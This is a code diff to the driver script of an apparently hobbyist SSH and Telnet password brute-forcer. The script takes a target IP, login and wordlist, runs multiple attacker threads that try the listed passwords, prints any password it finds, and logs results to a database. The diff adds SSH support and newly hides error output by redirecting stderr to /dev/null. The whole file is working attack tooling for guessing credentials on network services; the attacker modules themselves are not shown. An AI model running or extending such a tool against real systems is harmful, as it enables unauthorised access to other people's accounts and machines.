@@ -1,13 +1,14 @@
 import sys
 from argparser import argparse
-from ssh_attack import SSHTarget, SSHAttacker
-from telnet_attack import TelnetTarget, TelnetAttacker
+from ssh_attack import SSHAttacker
+from telnet_attack import TelnetAttacker
 from dbGUI import Attack, init_database, start_GUI
 from datetime import datetime
+from target import Target
 
 if __name__ == '__main__':
 
-    portmap = {"ftp": 21, "ssh": 22, "telnet": 23}
+    portmap = {"ssh": 22, "telnet": 23}
     (options, ip_addr, service) = argparse(sys.argv, portmap)
 
     if options.history is True:
@@ -15,7 +16,7 @@ if __name__ == '__main__':
         start_GUI(session)
         sys.exit(0)
 
-    target = TelnetTarget(
+    target = Target(
         ip_addr,
         portmap[service],
         options.login,
@@ -23,52 +24,62 @@ if __name__ == '__main__':
         options.threads
     )
 
-    #f = open('/dev/null', 'w')
-    #sys.stderr = f
+    f = open('/dev/null', 'w')
+    sys.stderr = f
 
     attackers = []
     for i in range(0, options.threads):
-        attacker = TelnetAttacker(target)
+        if service == "ssh":
+            attacker = SSHAttacker(target)
+            AttackerClass = SSHAttacker
+        elif service == "telnet":
+            attacker = TelnetAttacker(target)
+            AttackerClass = TelnetAttacker
+
         attackers.append(attacker)
     for attacker in attackers:
         attacker.start()
 
     try:
+        passw_counter = 0
         with open(target.wordlist) as passwords:
-            while TelnetAttacker.finish is False:
+            while AttackerClass.finish is False:
                 if target.queue_empty():
                     # fill the queue if it is empty and check for EOF
-                    if target.queue_fill(passwords) is False:
+                    passw_put = target.queue_fill(passwords)
+                    if passw_put is None:
                         break
+                    else:
+                        passw_counter += passw_put
             # wait for other threads to try all passwords
-            while not target.queue_empty() and TelnetAttacker.finish is False:
+            while passw_counter != (sum(attacker.tries for attacker in attackers)) and AttackerClass.finish is False:
                 pass
     except (SystemExit, KeyboardInterrupt):
         print("KeyboardInterrupt received, quitting...")
     finally:
-        TelnetAttacker.finish = True
+        AttackerClass.finish = True
         for attacker in attackers:
             attacker.join()
 
     print("\n-=-=-=-=-=  STATISTICS =-=-=-=-=-=-")
-    print("Successful: %s" % ("YES" if TelnetAttacker.success else "NO"))
+    print("Successful: %s" % ("YES" if AttackerClass.success else "NO"))
     print("IP addr: %s" % (ip_addr))
     print("Service: %s" % (service))
     print("Port: %d" % (target.port))
     print("Username: %s" % (target.login))
-    print("Password: %s" % ("?" if not TelnetAttacker.success else TelnetAttacker.password))
+    print("Password: %s" % ("?" if not AttackerClass.success else AttackerClass.password))
     print("Total attempts: %d" % (sum(attacker.tries for attacker in attackers)))
     print("-=-=-=-=-=-=-=-=-=-=-=-=--==-=-=-=-")
 
     if options.nostore is False:
         attack = Attack(
             end_time=datetime.now(),
-            successful=TelnetAttacker.success,
+            successful=AttackerClass.success,
             ip=ip_addr,
             service=service,
             port=target.port,
             login=target.login,
-            password=(None if not TelnetAttacker.success else TelnetAttacker.password),
+            password=(None if not AttackerClass.success else AttackerClass.password),
             total_tries=sum(attacker.tries for attacker in attackers)
         )
         session = init_database()
